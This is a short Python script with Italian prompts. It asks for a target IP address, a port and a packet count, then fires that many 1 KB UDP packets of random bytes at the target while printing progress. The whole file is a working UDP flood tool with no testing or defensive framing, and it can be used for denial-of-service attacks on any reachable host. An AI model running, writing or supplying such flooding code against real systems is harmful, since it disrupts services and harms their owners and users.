import socket
import random

ip_target = input("Inserisci l'IP target: ")
porta_target = int(input("Inserisci la porta target: "))
num_pacchetti = int(input("Quanti pacchetti da 1 KB vuoi inviare? "))

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

print(f"Invio di {num_pacchetti} pacchetti verso {ip_target}:{porta_target}...")

for i in range(num_pacchetti):
    pacchetto = bytes([random.randint(0, 255) for _ in range(1024)])

    sock.sendto(pacchetto, (ip_target, porta_target))

    if (i + 1) % 100 == 0:
        print(f"  Inviati {i + 1}/{num_pacchetti} pacchetti")

sock.close()
print("Invio completato.")